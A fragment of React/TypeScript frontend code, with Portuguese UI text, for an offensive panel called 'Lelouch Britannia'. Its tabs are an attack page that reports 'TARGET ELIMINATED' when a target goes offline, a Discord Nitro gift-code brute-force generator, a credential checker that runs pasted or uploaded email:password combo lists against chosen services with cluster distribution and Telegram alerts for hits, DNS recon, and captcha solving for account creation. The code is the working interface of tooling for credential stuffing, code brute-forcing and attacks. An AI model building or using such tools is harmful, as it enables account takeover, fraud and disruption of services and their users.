      {isRunning && method === "geass-override" && <GeassParticles />}

      {/* ── hCaptcha modal for browser-side account creation ── */}
      {dHCaptchaModal && (
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.85)", zIndex: 9999, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", gap: 16 }}>
          <div style={{ background: "#1a1a2e", border: "1px solid rgba(88,101,242,0.4)", borderRadius: 12, padding: "24px 28px", maxWidth: 420, width: "90%", textAlign: "center" }}>
            <div style={{ fontSize: 18, fontWeight: 700, color: "#7289da", marginBottom: 8 }}>🔐 Verificação hCaptcha</div>
            <div style={{ fontSize: 12, color: "#aaa", marginBottom: 16 }}>
              O Discord exigiu um captcha. Resolva abaixo usando <b style={{ color: "#ccc" }}>seu IP</b> — assim o token vai funcionar.
            </div>
            <div
              id="hcaptcha-container"
              ref={el => {
                if (!el || el.childElementCount > 0) return;
                const script = document.createElement("script");
                script.src = "https://js.hcaptcha.com/1/api.js?render=explicit";
                script.async = true;
                script.onload = () => {
                  (window as unknown as { hcaptcha: { render: (el: HTMLElement, opts: Record<string,unknown>) => void } }).hcaptcha.render(el, {
                    sitekey: dHCaptchaModal.sitekey,
                    ...(dHCaptchaModal.rqdata ? { rqdata: dHCaptchaModal.rqdata } : {}),
                    callback: (token: string) => {
                      setDHCaptchaModal(null);
                      if (dHCaptchaResolveRef.current) { dHCaptchaResolveRef.current(token); dHCaptchaResolveRef.current = null; }
                    },
                    "error-callback": () => {
                      setDHCaptchaModal(null);
                      if (dHCaptchaResolveRef.current) { dHCaptchaResolveRef.current(null); dHCaptchaResolveRef.current = null; }
                    },
                    theme: "dark",
                    size: "normal",
                  });
                };
                document.head.appendChild(script);
              }}
              style={{ display: "flex", justifyContent: "center", minHeight: 78 }}
            />
            <button
              onClick={() => { setDHCaptchaModal(null); if (dHCaptchaResolveRef.current) { dHCaptchaResolveRef.current(null); dHCaptchaResolveRef.current = null; } }}
              style={{ marginTop: 14, background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.15)", borderRadius: 6, color: "#888", cursor: "pointer", padding: "6px 18px", fontSize: 12 }}
            >
              Cancelar
            </button>
          </div>
        </div>
      )}

      {/* ── Toast container ── */}
      {toasts.length > 0 && (
        <div className="lb-toast-container" aria-live="polite">
          {toasts.map(t => (
            <div key={t.id} className={`lb-toast lb-toast--${t.type}`}>
              <span className="lb-toast-icon">
                {t.type === "launch" ? "👁" : t.type === "stop" ? "⏹" : t.type === "geass" ? "🟣" : "ℹ"}
              </span>
              <div className="lb-toast-body">
                <div className="lb-toast-title">{t.title}</div>
                {t.msg && <div className="lb-toast-msg">{t.msg}</div>}
              </div>
              <button className="lb-toast-close" onClick={() => setToasts(prev => prev.filter(x => x.id !== t.id))}>✕</button>
            </div>
          ))}
        </div>
      )}

      <div className="lb-wrap">

        {/* ── Header ── */}
        <header className="lb-header">
          {isRunning && (
            <div className={`lb-badge ${targetStatus === "offline" ? "lb-badge--kill" : ""}`}>
              <span className="lb-badge-dot" />
              {targetStatus === "offline" ? "TARGET ELIMINATED" : method === "geass-override" ? "GEASS OVERRIDE ACTIVE" : "GEASS ACTIVE"}
            </div>
          )}
          <div className="lb-title-row">
            <img src={GEASS_SYMBOL} className="lb-header-symbol" alt="Geass" />
            <h1 className="lb-title">Lelouch Britannia</h1>
            <img src={GEASS_SYMBOL} className="lb-header-symbol lb-header-symbol--flip" alt="" aria-hidden="true"/>
          </div>
          <p className="lb-sub">Because absolute power is even more beautiful when wielded by Zero.</p>
          <button
            className="lb-theme-toggle"
            title={`Switch to ${theme === "lelouch" ? "Suzaku (navy)" : "Lelouch (crimson)"} theme`}
            onClick={() => setTheme(t => t === "lelouch" ? "suzaku" : "lelouch")}
          >
            {theme === "lelouch" ? "⚔ Suzaku Mode" : "👁 Lelouch Mode"}
          </button>

          {/* ── Page tabs ── */}
          <div className="lb-page-tabs">
            <button
              className={`lb-page-tab ${activePage === "attack" ? "lb-page-tab--active" : ""}`}
              onClick={() => setActivePage("attack")}
            >
              ⚔ Ataque
            </button>
            <button
              className={`lb-page-tab ${activePage === "nitro" ? "lb-page-tab--active" : ""}`}
              onClick={() => setActivePage("nitro")}
            >
              🎁 Nitro Gen
              {nitroRunning && activePage !== "nitro" && (
                <span style={{
                  display: "inline-flex", alignItems: "center", gap: 4,
                  marginLeft: 6, padding: "1px 7px", borderRadius: 10,
                  background: nitroValid > 0 ? "rgba(46,204,113,0.2)" : "rgba(155,89,182,0.2)",
                  border: `1px solid ${nitroValid > 0 ? "rgba(46,204,113,0.5)" : "rgba(155,89,182,0.5)"}`,
                  fontSize: 10, fontWeight: 600, color: nitroValid > 0 ? "#2ecc71" : "#9b59b6",
                }}>
                  <span style={{
                    width: 6, height: 6, borderRadius: "50%",
                    background: nitroValid > 0 ? "#2ecc71" : "#9b59b6",
                    animation: "lb-pulse 1.4s ease-in-out infinite",
                    flexShrink: 0,
                  }} />
                  {nitroValid > 0 ? `${nitroValid} HIT` : "LIVE"}
                </span>
              )}
            </button>
            <button
              className={`lb-page-tab ${activePage === "checker" ? "lb-page-tab--active" : ""}`}
              onClick={() => setActivePage("checker")}
            >
              🔑 Credential Checker
              {(credRunning || credJobId) && activePage !== "checker" && (
                <span style={{
                  display: "inline-flex", alignItems: "center", gap: 4,
                  marginLeft: 6, padding: "1px 7px", borderRadius: 10,
                  background: credRunning ? "rgba(46,204,113,0.2)" : "rgba(212,175,55,0.15)",
                  border: `1px solid ${credRunning ? "rgba(46,204,113,0.5)" : "rgba(212,175,55,0.4)"}`,
                  fontSize: 10, fontWeight: 600, color: credRunning ? "#2ecc71" : "#d4af37",
                }}>
                  <span style={{
                    width: 6, height: 6, borderRadius: "50%",
                    background: credRunning ? "#2ecc71" : "#d4af37",
                    animation: credRunning ? "lb-pulse 1.4s ease-in-out infinite" : "none",
                    flexShrink: 0,
                  }} />
                  {credRunning ? "RODANDO" : "BG"}
                </span>
              )}
            </button>
            <button
              className={`lb-page-tab ${activePage === "dns" ? "lb-page-tab--active" : ""}`}
              onClick={() => setActivePage("dns")}
            >
              🌐 DNS Recon
            </button>
            <button
              className={`lb-page-tab ${activePage === "discord" ? "lb-page-tab--active" : ""}`}
              onClick={() => {
                setActivePage("discord");
                if (discordGuilds.length === 0 && !discordLoading) {
                  setDiscordLoading(true);
                  setDiscordError("");
                  Promise.all([
                    fetch(`${BASE}/api/discord/guilds`).then(r => r.json()),
                    fetch(`${BASE}/api/discord/invite-link`).then(r => r.json()),
                  ]).then(([gData, iData]) => {
                    const gd = gData as { guilds?: DiscordGuild[]; error?: string };
                    const id = iData as { url?: string; applicationId?: string };
                    if (gd.guilds) setDiscordGuilds(gd.guilds);
                    else setDiscordError(gd.error ?? "Erro ao carregar servidores");
                    if (id.url) setDiscordInviteUrl(id.url);
                    if (id.applicationId) setDiscordAppId(id.applicationId);
                    setDiscordLoading(false);
                  }).catch(err => { setDiscordError(String(err)); setDiscordLoading(false); });
                }
              }}
            >
              🤖 Discord
            </button>
          </div>
        </header>

        {/* ══════════════════════════════════════════════
            NITRO GENERATOR PAGE
        ══════════════════════════════════════════════ */}
        {activePage === "nitro" && (() => {
          const elapsed  = nitroStartTime > 0 ? Math.round((Date.now() - nitroStartTime) / 1000) : 0;
          const hitRate  = nitroTotal > 0 ? ((nitroValid / nitroTotal) * 100).toFixed(2) : "0.00";
          const speed    = elapsed > 0 ? (nitroTotal / elapsed).toFixed(1) : "0";
          return (
          <div className="lb-cred-page">
            <div className="lb-cred-layout">

              {/* ── LEFT: Controls ── */}
              <div className="lb-cred-left" style={{ maxWidth: 380 }}>

                {/* Status card */}
                <section className="lb-cred-section" style={{
                  borderColor: nitroRunning ? (nitroValid > 0 ? "rgba(46,204,113,0.5)" : "rgba(155,89,182,0.5)") : "rgba(255,255,255,0.07)",
                }}>
                  <div className="lb-cred-section-header">
                    <span className="lb-cred-section-icon">🎁</span>
                    <h3 className="lb-cred-section-title">Nitro Generator</h3>
                    {nitroRunning && (
                      <span style={{
                        marginLeft: "auto", display: "inline-flex", alignItems: "center", gap: 5,
                        padding: "2px 10px", borderRadius: 12, fontSize: 11, fontWeight: 700,
                        background: nitroValid > 0 ? "rgba(46,204,113,0.15)" : "rgba(155,89,182,0.15)",
                        border: `1px solid ${nitroValid > 0 ? "rgba(46,204,113,0.5)" : "rgba(155,89,182,0.4)"}`,
                        color: nitroValid > 0 ? "#2ecc71" : "#9b59b6",
                      }}>
                        <span style={{ width: 6, height: 6, borderRadius: "50%", background: "currentColor", animation: "lb-pulse 1.4s ease-in-out infinite", flexShrink: 0 }} />
                        LIVE
                      </span>
                    )}
                  </div>
                  <p style={{ fontSize: 12, color: "#aaa", marginBottom: 14, lineHeight: 1.6 }}>
                    Gera e verifica códigos Nitro via Discord API. Roda em ciclos contínuos via API server com rate-limit inteligente.
                  </p>

                  {/* Batch size */}
                  <div style={{ marginBottom: 14 }}>
                    <label style={{ display: "flex", justifyContent: "space-between", fontSize: 12, color: "#ccc", marginBottom: 6 }}>
                      <span>Códigos por ciclo</span>
                      <span style={{ color: "#9b59b6", fontWeight: 700 }}>{nitroBatch}</span>
                    </label>
                    <input
                      type="range" min={5} max={20} step={5}
                      value={nitroBatch}
                      disabled={nitroRunning}
                      onChange={e => setNitroBatch(Number(e.target.value))}
                      style={{ width: "100%", accentColor: "#9b59b6" }}
                    />
                    <div style={{ display: "flex", justifyContent: "space-between", fontSize: 10, color: "#666" }}>
                      <span>5</span><span>20</span>
                    </div>
                  </div>

                  {/* Code type */}
                  <div style={{ marginBottom: 18 }}>
                    <label style={{ fontSize: 12, color: "#ccc", display: "block", marginBottom: 6 }}>Tipo de código</label>
                    <div style={{ display: "flex", gap: 6 }}>
                      {(["classic", "boost", "both"] as const).map(t => (
                        <button
                          key={t}
                          disabled={nitroRunning}
                          onClick={() => setNitroType(t)}
                          style={{
                            flex: 1, padding: "6px 0", borderRadius: 8, fontSize: 11, fontWeight: 600, cursor: nitroRunning ? "not-allowed" : "pointer",
                            background: nitroType === t ? "rgba(155,89,182,0.25)" : "rgba(255,255,255,0.04)",
                            border: `1px solid ${nitroType === t ? "rgba(155,89,182,0.7)" : "rgba(255,255,255,0.1)"}`,
                            color: nitroType === t ? "#c39bd3" : "#888",
                          }}
                        >
                          {t === "classic" ? "🎮 Classic" : t === "boost" ? "💎 Boost" : "🔀 Ambos"}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Start / Stop button */}
                  {!nitroRunning ? (
                    <button
                      className="lb-btn-launch"
                      style={{ width: "100%", padding: "12px 0", fontSize: 14, fontWeight: 700 }}
                      onClick={startNitroGenerator}
                    >
                      ⚡ Iniciar Gerador
                    </button>
                  ) : (
                    <button
                      className="lb-btn-stop"
                      style={{ width: "100%", padding: "12px 0", fontSize: 14, fontWeight: 700 }}
                      onClick={stopNitroGenerator}
                    >
                      ⏹ Parar Gerador
                    </button>
                  )}
                </section>

                {/* Stats card */}
                <section className="lb-cred-section">
                  <div className="lb-cred-section-header">
                    <span className="lb-cred-section-icon">📊</span>
                    <h3 className="lb-cred-section-title">Estatísticas</h3>
                    {nitroRunning && (
                      <span style={{ marginLeft: "auto", fontSize: 10, color: "#9b59b6", fontFamily: "monospace" }}>
                        {Math.round(Number(speed) * 60)}/min
                      </span>
                    )}
                  </div>

                  {/* Big hero numbers */}
                  <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 6, marginBottom: 10 }}>
                    {[
                      { label: "CHECADOS", value: nitroTotal, color: "#aaa", bg: "rgba(255,255,255,0.04)" },
                      { label: "VÁLIDOS", value: nitroValid, color: "#2ecc71", bg: "rgba(46,204,113,0.08)", border: "rgba(46,204,113,0.25)" },
                      { label: "CICLOS", value: nitroCycles, color: "#9b59b6", bg: "rgba(155,89,182,0.08)", border: "rgba(155,89,182,0.25)" },
                    ].map(s => (
                      <div key={s.label} style={{
                        background: s.bg ?? "rgba(255,255,255,0.04)",
                        borderRadius: 10, padding: "12px 8px", textAlign: "center",
                        border: `1px solid ${s.border ?? "rgba(255,255,255,0.07)"}`,
                      }}>
                        <div style={{ fontSize: 22, fontWeight: 800, color: s.color, letterSpacing: "-0.5px", lineHeight: 1 }}>
                          {s.value.toLocaleString()}
                        </div>
                        <div style={{ fontSize: 9, color: "#555", marginTop: 4, fontWeight: 600, letterSpacing: 1 }}>{s.label}</div>
                      </div>
                    ))}
                  </div>

                  {/* Distribution bar */}
                  {nitroTotal > 0 && (
                    <div style={{ marginBottom: 10 }}>
                      <div style={{ display: "flex", borderRadius: 6, overflow: "hidden", height: 8, gap: 1 }}>
                        {[
                          { val: nitroValid,   color: "#2ecc71" },
                          { val: nitroInvalid, color: "#e74c3c" },
                          { val: nitroRL,      color: "#f39c12" },
                          { val: nitroErrors,  color: "#e67e22" },
                        ].map((s, i) => (
                          s.val > 0 ? (
                            <div key={i} style={{
                              flex: s.val, background: s.color, opacity: 0.8,
                              transition: "flex 0.4s ease",
                            }} />
                          ) : null
                        ))}
                      </div>
                      <div style={{ display: "flex", gap: 10, marginTop: 5, flexWrap: "wrap" }}>
                        {[
                          { label: "Válidos", val: nitroValid, color: "#2ecc71" },
                          { label: "Inválidos", val: nitroInvalid, color: "#e74c3c" },
                          { label: "Rate-ltd", val: nitroRL, color: "#f39c12" },
                          { label: "Erros", val: nitroErrors, color: "#e67e22" },
                        ].map(s => (
                          <span key={s.label} style={{ fontSize: 10, color: "#888", display: "flex", alignItems: "center", gap: 4 }}>
                            <span style={{ width: 6, height: 6, borderRadius: "50%", background: s.color, flexShrink: 0 }} />
                            <span style={{ color: s.color, fontWeight: 700 }}>{s.val.toLocaleString()}</span>
                            <span>{s.label}</span>
                          </span>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Hit rate bar */}
                  <div style={{ marginBottom: 10 }}>
                    <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 4 }}>
                      <span style={{ fontSize: 10, color: "#888" }}>Hit Rate</span>
                      <span style={{ fontSize: 11, fontWeight: 700, color: nitroValid > 0 ? "#2ecc71" : "#555", fontFamily: "monospace" }}>
                        {hitRate}%
                      </span>
                    </div>
                    <div style={{ height: 4, background: "rgba(255,255,255,0.06)", borderRadius: 4, overflow: "hidden" }}>
                      <div style={{
                        height: "100%", borderRadius: 4,
                        background: "linear-gradient(90deg, #9b59b6, #2ecc71)",
                        width: `${Math.min(100, Number(hitRate))}%`,
                        transition: "width 0.6s ease",
                        minWidth: nitroValid > 0 ? 4 : 0,
                      }} />
                    </div>
                  </div>

                  {/* Speed + Time row */}
                  <div style={{ display: "flex", gap: 6 }}>
                    <div style={{ flex: 1, background: "rgba(52,152,219,0.07)", borderRadius: 8, padding: "8px 10px", border: "1px solid rgba(52,152,219,0.2)", textAlign: "center" }}>
                      <div style={{ fontSize: 15, fontWeight: 700, color: "#3498db", fontFamily: "monospace" }}>
                        {Math.round(Number(speed) * 60)}<span style={{ fontSize: 9, color: "#3498db99", marginLeft: 2 }}>/min</span>
                      </div>
                      <div style={{ fontSize: 9, color: "#555", marginTop: 2, letterSpacing: 1 }}>VELOCIDADE</div>
                    </div>
                    <div style={{ flex: 1, background: "rgba(255,255,255,0.03)", borderRadius: 8, padding: "8px 10px", border: "1px solid rgba(255,255,255,0.06)", textAlign: "center" }}>
                      <div style={{ fontSize: 15, fontWeight: 700, color: "#7f8c8d", fontFamily: "monospace" }}>
                        {elapsed >= 60 ? `${Math.floor(elapsed / 60)}m${elapsed % 60}s` : `${elapsed}s`}
                      </div>
                      <div style={{ fontSize: 9, color: "#555", marginTop: 2, letterSpacing: 1 }}>TEMPO</div>
                    </div>
                    <div style={{ flex: 1, background: "rgba(155,89,182,0.07)", borderRadius: 8, padding: "8px 10px", border: "1px solid rgba(155,89,182,0.2)", textAlign: "center" }}>
                      <div style={{ fontSize: 15, fontWeight: 700, color: "#9b59b6", fontFamily: "monospace" }}>
                        {nitroRL.toLocaleString()}<span style={{ fontSize: 9, color: "#9b59b699", marginLeft: 2 }}>rl</span>
                      </div>
                      <div style={{ fontSize: 9, color: "#555", marginTop: 2, letterSpacing: 1 }}>RATE-LTD</div>
                    </div>
                  </div>
                </section>

              </div>

              {/* ── RIGHT: Hits + Live log ── */}
              <div className="lb-cred-right">

                {/* Hits list */}
                <section className="lb-cred-section" style={{ flex: "0 0 auto", maxHeight: 280, overflow: "hidden" }}>
                  <div className="lb-cred-section-header">
                    <span className="lb-cred-section-icon">🏆</span>
                    <h3 className="lb-cred-section-title">Códigos Válidos Encontrados</h3>
                    <span style={{ marginLeft: "auto", padding: "1px 8px", borderRadius: 8, background: "rgba(46,204,113,0.15)", border: "1px solid rgba(46,204,113,0.3)", fontSize: 11, color: "#2ecc71", fontWeight: 700 }}>
                      {nitroHits.length}
                    </span>
                  </div>
                  {nitroHits.length === 0 ? (
                    <div style={{ textAlign: "center", padding: "24px 0", color: "#555", fontSize: 13 }}>
                      Nenhum hit ainda. O Geass está buscando...
                    </div>
                  ) : (
                    <div style={{ overflowY: "auto", maxHeight: 200, display: "flex", flexDirection: "column", gap: 6 }}>
                      {[...nitroHits].reverse().map((h, i) => (
                        <div key={i} style={{ display: "flex", alignItems: "center", gap: 10, padding: "8px 12px", background: "rgba(46,204,113,0.08)", borderRadius: 8, border: "1px solid rgba(46,204,113,0.2)" }}>
                          <span style={{ fontSize: 18 }}>🎁</span>
                          <div style={{ flex: 1, minWidth: 0 }}>
                            <div style={{ fontFamily: "monospace", fontSize: 12, color: "#2ecc71", fontWeight: 700 }}>{h.code}</div>
                            <div style={{ fontSize: 11, color: "#888" }}>{h.plan}</div>
                          </div>
                          <div style={{ display: "flex", gap: 6 }}>
                            <button
                              style={{ padding: "3px 8px", borderRadius: 6, fontSize: 10, fontWeight: 600, background: "rgba(46,204,113,0.15)", border: "1px solid rgba(46,204,113,0.4)", color: "#2ecc71", cursor: "pointer" }}
                              onClick={() => navigator.clipboard.writeText(h.code).catch(() => {})}
                            >
                              📋
                            </button>
                            <a
                              href={`https://discord.gift/${h.code}`}
                              target="_blank" rel="noreferrer"
                              style={{ padding: "3px 8px", borderRadius: 6, fontSize: 10, fontWeight: 600, background: "rgba(88,101,242,0.15)", border: "1px solid rgba(88,101,242,0.4)", color: "#7289da", textDecoration: "none" }}
                            >
                              🔗
                            </a>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </section>

                {/* Live log */}
                <section className="lb-cred-section" style={{ flex: 1 }}>
                  <div className="lb-cred-section-header" style={{ marginBottom: 8 }}>
                    <span className="lb-cred-section-icon">📋</span>
                    <h3 className="lb-cred-section-title">Log em Tempo Real</h3>
                    {nitroLogs.length > 0 && (
                      <button
                        style={{ marginLeft: "auto", padding: "2px 8px", borderRadius: 6, fontSize: 10, background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)", color: "#888", cursor: "pointer" }}
                        onClick={() => setNitroLogs([])}
                      >
                        Limpar
                      </button>
                    )}
                  </div>
                  <div style={{
                    fontFamily: "monospace", fontSize: 11, lineHeight: 1.7,
                    maxHeight: 380, overflowY: "auto", display: "flex", flexDirection: "column",
                    background: "rgba(0,0,0,0.3)", borderRadius: 8, padding: "8px 10px",
                    border: "1px solid rgba(255,255,255,0.05)",
                  }}>
                    {nitroLogs.length === 0 ? (
                      <span style={{ color: "#444" }}>Aguardando início do gerador...</span>
                    ) : (
                      [...nitroLogs].reverse().map((l, i) => (
                        <span key={i} style={{
                          color: l.type === "success" ? "#2ecc71" : l.type === "error" ? "#e74c3c" : l.type === "warn" ? "#f39c12" : "#888",
                        }}>
                          {l.text}
                        </span>
                      ))
                    )}
                  </div>
                </section>

              </div>
            </div>
          </div>
          );
        })()}

        {/* ══════════════════════════════════════════════
            CREDENTIAL CHECKER PAGE
        ══════════════════════════════════════════════ */}
        {activePage === "checker" && (
          <div className="lb-cred-page">

            {/* ── Reconnect banner — shown when a background job exists but panel isn't connected ── */}
            {credJobId && !credRunning && (
              <div style={{ display:"flex", alignItems:"center", gap:10, padding:"10px 14px", marginBottom:8, background:"rgba(212,175,55,0.12)", border:"1px solid rgba(212,175,55,0.35)", borderRadius:8 }}>
                <span style={{ fontSize:16 }}>🔄</span>
                <span style={{ flex:1, color:"#d4af37", fontSize:13, fontFamily:"var(--font-mono)" }}>
                  Checker em background — job <code style={{ background:"rgba(0,0,0,0.3)", padding:"1px 5px", borderRadius:3 }}>{credJobId}</code> ainda ativo
                </span>
                <button
                  className="lb-btn lb-btn--gold"
                  style={{ padding:"5px 12px", fontSize:12 }}
                  onClick={() => void reconnectToCheckerJob(credJobId)}
                >Reconectar</button>
                <button
                  className="lb-cred-mini-btn"
                  title="Parar o job e descartar"
                  onClick={() => {
                    void fetch(`${BASE}/api/checker/${credJobId}`, { method: "DELETE" }).catch(() => {});
                    setCredJobId(null);
                    localStorage.removeItem("lb-checker-job-id");
                  }}
                >✕</button>
              </div>
            )}

            {/* ── Live stats banner (when running or done) ── */}
            {(credRunning || credDone > 0) && (
              <div className="lb-cred-live-banner">
                <div className="lb-cred-live-left">
                  <span className={`lb-cred-live-dot ${credRunning && !credPaused ? "lb-cred-live-dot--pulse" : ""}`} style={credPaused ? { background: "#f39c12" } : undefined} />
                  <span className="lb-cred-live-label">
                    {credPaused ? "⏸ PAUSADO" : credRunning ? "CHECKER ATIVO" : "CONCLUÍDO"}
                  </span>
                  <span className="lb-cred-live-target">
                    {CRED_TARGETS[credTarget]?.icon} {CRED_TARGETS[credTarget]?.label}
                  </span>
                  {wakeLockActive && (
                    <span title="Wake Lock ativo — tela não vai apagar" style={{ display:"inline-flex", alignItems:"center", gap:3, marginLeft:6, fontSize:10, color:"#2ecc71", opacity:0.85 }}>
                      <span style={{ width:6, height:6, borderRadius:"50%", background:"#2ecc71", flexShrink:0 }} />
                      wake lock
                    </span>
                  )}
                </div>
                <div className="lb-cred-live-counters">
                  <span className="lb-cred-live-counter lb-cred-live-counter--hit">
                    <span className="lb-cred-live-num">{credHits.length}</span>
                    <span className="lb-cred-live-key">HITs</span>
                  </span>
                  <span className="lb-cred-live-counter lb-cred-live-counter--fail">
                    <span className="lb-cred-live-num">{credFails}</span>
                    <span className="lb-cred-live-key">FAILs</span>
                  </span>
                  <span className="lb-cred-live-counter lb-cred-live-counter--err">
                    <span className="lb-cred-live-num">{credErrors}</span>
                    <span className="lb-cred-live-key">ERROs</span>
                  </span>
                  <span className="lb-cred-live-counter">
                    <span className="lb-cred-live-num">{credDone}/{credTotal}</span>
                    <span className="lb-cred-live-key">{credTotal > 0 ? Math.round(credDone / credTotal * 100) : 0}%</span>
                  </span>
                </div>
              </div>
            )}

            {/* ── Progress bar ── */}
            {(credRunning || credDone > 0) && (
              <div className="lb-cred-bar-outer">
                <div
                  className={`lb-cred-bar-inner ${credRunning ? "lb-cred-bar-inner--animated" : ""}`}
                  style={{ width: credTotal > 0 ? `${Math.round(credDone / credTotal * 100)}%` : "0%" }}
                />
              </div>
            )}

            {/* ── Telegram notification config ── */}
            <details style={{ marginBottom: 8 }}>
              <summary style={{ cursor: "pointer", fontSize: 12, color: "var(--color-text-muted)", fontFamily: "var(--font-mono)", padding: "6px 10px", background: "rgba(0,0,0,0.2)", borderRadius: 6, userSelect: "none", listStyle: "none", display: "flex", alignItems: "center", gap: 6 }}>
                <span>📲</span>
                <span>Notificação Telegram</span>
                {telegramToken.trim() && telegramChatId.trim() && (
                  <span style={{ marginLeft: "auto", fontSize: 10, color: "#2ecc71" }}>● ativo</span>
                )}
              </summary>
              <div style={{ display: "flex", gap: 8, padding: "8px 10px", background: "rgba(0,0,0,0.15)", borderRadius: "0 0 6px 6px", flexWrap: "wrap" }}>
                <input
                  type="text"
                  placeholder="Bot Token (ex: 123456:ABC...)"
                  value={telegramToken}
                  onChange={e => { setTelegramToken(e.target.value); localStorage.setItem("lb-tg-token", e.target.value); }}
                  style={{ flex: 2, minWidth: 180, background: "rgba(0,0,0,0.4)", border: "1px solid rgba(212,175,55,0.2)", borderRadius: 5, padding: "5px 8px", color: "var(--color-text)", fontSize: 12, fontFamily: "var(--font-mono)" }}
                />
                <input
                  type="text"
                  placeholder="Chat ID (ex: -1001234567890)"
                  value={telegramChatId}
                  onChange={e => { setTelegramChatId(e.target.value); localStorage.setItem("lb-tg-chat", e.target.value); }}
                  style={{ flex: 1, minWidth: 140, background: "rgba(0,0,0,0.4)", border: "1px solid rgba(212,175,55,0.2)", borderRadius: 5, padding: "5px 8px", color: "var(--color-text)", fontSize: 12, fontFamily: "var(--font-mono)" }}
                />
                <button
                  className="lb-cred-mini-btn"
                  disabled={!telegramToken.trim() || !telegramChatId.trim()}
                  onClick={async () => {
                    try {
                      const r = await fetch(`https://api.telegram.org/bot${telegramToken.trim()}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: telegramChatId.trim(), text: "✅ *Lelouch Panel* — Telegram conectado com sucesso!", parse_mode: "Markdown" }),
                      });
                      if (r.ok) addToast("geass", "Telegram", "Mensagem de teste enviada!");
                      else addToast("error", "Telegram", "Erro ao enviar — verifique token/chat ID");
                    } catch { addToast("error", "Telegram", "Falha na conexão"); }
                  }}
                >🔔 Testar</button>
              </div>
            </details>

            {/* ── Two-column layout: target selector + input ── */}
            <div className="lb-cred-main-grid">

              {/* Left: target selector by category */}
              <section className="lb-cred-section lb-cred-targets-section">
                <div className="lb-cred-section-header">
                  <span className="lb-cred-section-icon">🎯</span>
                  <h3 className="lb-cred-section-title">Alvo</h3>
                  {clusterNodes.filter(n => n.trim()).length > 0 && (
                    <button
                      className={`lb-cred-mini-btn ${credUseCluster ? "lb-cred-mini-btn--gold" : ""}`}
                      style={{ marginLeft: "auto", fontSize: "11px" }}
                      onClick={() => setCredUseCluster(v => !v)}
                      disabled={credRunning}
                      title={credUseCluster ? "Desativar distribuição em cluster" : `Distribuir credenciais entre ${clusterNodes.filter(n=>n.trim()).length + 1} nodes`}
                    >
                      {credUseCluster ? `🌐 Cluster (${clusterNodes.filter(n=>n.trim()).length + 1} nodes)` : "🌐 Usar Cluster"}
                    </button>
                  )}
                </div>
                {CRED_CATEGORIES.map(cat => (
                  <div key={cat} className="lb-cred-category">
                    <span className="lb-cred-category-label">{cat}</span>
                    <div className="lb-cred-target-grid lb-cred-target-grid--logos">
                      {Object.entries(CRED_TARGETS)
                        .filter(([, m]) => m.category === cat)
                        .map(([k, m]) => {
                          const isActive = credTarget === k;
                          const initials = m.label.replace(/[^A-Za-z0-9]/g, "").slice(0, 2).toUpperCase();
                          const logoColor = m.logoColor ?? "#444";
                          return (
                            <button
                              key={k}
                              className={`lb-cred-target-btn lb-cred-target-btn--logo ${isActive ? "lb-cred-target-btn--active" : ""}`}
                              onClick={() => setCredTarget(k as typeof credTarget)}
                              disabled={credRunning}
                              title={`${m.label}${m.note ? ` — ${m.note}` : ""}`}
                            >
                              <div className="lb-cred-logo-wrap">
                                {m.logoUrl ? (
                                  <img
                                    src={m.logoUrl}
                                    alt={m.label}
                                    className="lb-cred-logo-img"
                                    onError={e => {
                                      const img = e.currentTarget as HTMLImageElement;
                                      img.style.display = "none";
                                      const fb = img.nextElementSibling as HTMLElement;
                                      if (fb) fb.style.display = "flex";
                                    }}
                                  />
                                ) : null}
                                <div
                                  className="lb-cred-logo-fallback"
                                  style={{ background: `${logoColor}22`, border: `1px solid ${logoColor}44`, display: m.logoUrl ? "none" : "flex" }}
                                >
                                  <span style={{ fontSize: "1.25rem", lineHeight: 1 }}>{m.icon}</span>
                                </div>
                                {isActive && <div className="lb-cred-logo-ring" />}
                              </div>
                              <span className="lb-cred-target-name">{m.label}</span>
                              {m.note && <span className="lb-cred-target-note">{m.note}</span>}
                            </button>
                          );
                        })}
                    </div>
                  </div>
                ))}
              </section>

              {/* Right: credential input + controls */}
              <div className="lb-cred-input-col">
                <section className="lb-cred-section lb-cred-input-section">
                  <div className="lb-cred-section-header">
                    <span className="lb-cred-section-icon">📋</span>
                    <h3 className="lb-cred-section-title">Credenciais</h3>
                    <span className="lb-cred-count" style={credFileLimit > 0 ? { color: "#D4AF37" } : undefined}>
                      {credText ? credText.split("\n").filter(l => l.trim()).length : 0} linhas
                      {credFileLimit > 0 && <span style={{ opacity: 0.65 }}> / max {credFileLimit.toLocaleString("pt-BR")}</span>}
                    </span>
                  </div>
                  <textarea
                    className="lb-cred-textarea"
                    placeholder={"user@email.com:senha123\noutro:outrasenha\ncpf:senha\n..."}
                    value={credText}
                    onChange={e => setCredText(e.target.value)}
                    disabled={credRunning}
                    spellCheck={false}
                  />
                  <div className="lb-cred-btn-row">
                    <button
                      className="lb-cred-mini-btn"
                      onClick={() => credFileRef.current?.click()}
                      disabled={credRunning}
                      title={credFileLimit > 0 ? `Ler até ${credFileLimit.toLocaleString("pt-BR")} linhas do arquivo` : "Ler arquivo completo"}
                    >📂 Arquivo</button>
                    <select
                      value={credFileLimit}
                      onChange={e => setCredFileLimit(Number(e.target.value))}
                      disabled={credRunning}
                      title="Limite de linhas ao carregar arquivo"
                      style={{
                        background: credFileLimit > 0 ? "rgba(212,175,55,0.15)" : "rgba(0,0,0,0.35)",
                        border: `1px solid ${credFileLimit > 0 ? "rgba(212,175,55,0.5)" : "rgba(255,255,255,0.12)"}`,
                        color: credFileLimit > 0 ? "#D4AF37" : "var(--color-text-muted)",
                        borderRadius: 5, padding: "3px 6px", fontSize: 11,
                        fontFamily: "var(--font-mono)", cursor: "pointer",
                      }}
                    >
                      <option value={0}>∞ Todas</option>
                      <option value={500}>500 lin.</option>
                      <option value={1000}>1 000</option>
                      <option value={2000}>2 000</option>
                      <option value={5000}>5 000</option>
                      <option value={10000}>10 000</option>
                      <option value={20000}>20 000</option>
                      <option value={50000}>50 000</option>
